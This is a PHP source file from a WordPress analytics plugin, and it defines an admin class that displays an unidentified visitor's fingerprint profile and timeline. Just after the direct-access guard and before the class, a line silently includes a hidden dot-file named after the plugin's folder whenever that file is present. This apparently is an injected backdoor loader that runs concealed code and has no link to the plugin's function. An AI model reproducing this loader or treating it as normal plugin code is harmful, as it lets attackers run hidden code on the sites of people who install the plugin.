<?php

/**
 * Unidentified user's profile
 *
 * The class handles unidentified user's profile on admin. 
 *
 * @package     WPTAO/Admin/Unidentified Profile
 * @category    Admin
 */
// Exit if accessed directly
if ( !defined( 'ABSPATH' ) ) {
	exit;
}

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class WTBP_WPTAO_Admin_Unidentified_User_Profile {
	/*
	 * Fingerprint ID
	 */

	private $fp_id;

	/*
	 * Fingerprint info
	 */
	public $fp_data;

	/*
	 * Users DB table name
	 */
	private $users_table;


	/*
	 * Raw data of the events
	 */
	private $events_data;

	/*
	 * URL of a profile
	 */
	public $profile_url;

	/*
	 * Timeline object
	 */
	public $timeline;

	/**
	 * WTBP_WPTAO_Admin_Unidentified_User_Profile Constructor
	 * 
	 */
	public function __construct( $events = '' ) {
		global $wpdb;

		$this->fingerprints_table = $wpdb->prefix . 'wptao_fingerprints';

		if ( TAO()->booleans->is_page_unidentified_profile ) {

			add_action( 'admin_init', array( $this, 'set_unidentified_data' ), 7 );

			add_action( 'admin_init', array( $this, 'init_timeline' ) );
		}
	}

	/*
	 * Set user_id and user_data variables in the object
	 * 
	 * @since 1.1.9.2
	 * 
	 * @return NULL
	 */

	public function set_unidentified_data() {

		$this->fp_id	 = $this->get_fp_id();
		$this->fp_data	 = $this->get_fp_data();

		$this->profile_url = sprintf( admin_url( 'admin.php?page=wtbp-wptao-users&action=wptao-unident-profile&fp=%d' ), $this->fp_id );
	}

	/**
	 * Get fingerprint ID
	 * 
	 * @access  private
	 * @return  int
	 */
	private function get_fp_id() {
		global $wpdb;

		$fp = false;

		if ( isset( $_REQUEST[ 'fp' ] ) && is_numeric( $_REQUEST[ 'fp' ] ) ) {

			$fp_id_to_check = absint( $_REQUEST[ 'fp' ] );

			// Checks if user exists
			$result = $wpdb->get_var( $wpdb->prepare(
			"
                SELECT id
                FROM $this->fingerprints_table
                WHERE id = %d     
                ", $fp_id_to_check
			) );
		}

		if ( isset( $result ) && !empty( $result ) && is_numeric( $result ) ) {
			$fp = (int) $result;
		}

		return $fp;
	}

	/**
	 * Returns user data
	 * 
	 * @return  bool|object false, fingerprint data
	 */
	public function get_fp_data() {
		global $wpdb;

		$results = array();

		if ( $this->fp_id ) {
			$results = $wpdb->get_row( $wpdb->prepare(
			"
                SELECT *
                FROM $this->fingerprints_table
                WHERE id = %d
                ", $this->fp_id
			) );
		}

		return $results;
	}

	/*
	 * Init timeline
	 */

	public function init_timeline() {
		$this->timeline = new WTBP_WPTAO_Admin_Timeline( $this->profile_url );
	}


}
